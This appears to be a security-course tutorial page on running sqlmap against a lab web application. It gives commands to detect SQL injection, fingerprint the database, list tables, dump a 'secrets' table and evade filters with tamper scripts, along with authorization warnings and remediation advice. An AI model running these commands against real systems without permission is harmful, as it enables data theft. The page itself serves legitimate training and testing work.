# Real tool: automated SQL injection with sqlmap (hedged)

Offline version: [mini-sqlmap lab](../labs/mini-sqlmap/README.md). sqlmap is open source and actively maintained; options change, so **check `sqlmap -hh`** for your version.

> Only test systems you own or have written permission to test. sqlmap can modify or delete data with some options; never point it at production.

## Typical workflow in the course lab

1. Capture the request in Burp and save it: right-click → **Copy to file** → `req.txt`.
2. Detect:

```text
sqlmap -r req.txt -p id --batch
sqlmap -u "https://lab.example/product?id=1" --batch --technique=BT --level 2 --risk 1
```

3. Fingerprint and enumerate:

```text
sqlmap -r req.txt -p id --batch --banner --current-user --current-db --is-dba
sqlmap -r req.txt -p id --batch --dbs
sqlmap -r req.txt -p id --batch -D shop --tables
sqlmap -r req.txt -p id --batch -D shop -T secrets --dump
```

4. JSON bodies: mark the injection point with `*` in `req.txt` (for example `{"id": "1*"}`) or use `--data` with `-p`.
5. Headers and cookies: `--level 3` or higher tests cookies and some headers; `-p "X-Forwarded-For"` targets one.

## Useful options

| Option | Meaning |
|---|---|
| `--technique=BEUSTQ` | Boolean, Error, Union, Stacked, Time, inline Query |
| `--level 1-5` / `--risk 1-3` | More payloads and locations / riskier payloads (avoid high risk on shared data) |
| `--dbms=oracle` | Skip fingerprinting when you know the DBMS |
| `--tamper=space2comment` | Evade naive filters (shows why denylists fail) |
| `--delay`, `--threads` | Be gentle on the target |
| `--flush-session` | Ignore cached results |

## What to report

Injectable parameter, technique, DBMS, the minimal proof (current user/version), and the fix: bind variables, allowlisted identifiers, least-privilege DB account. Do not dump real personal data beyond what proves impact.
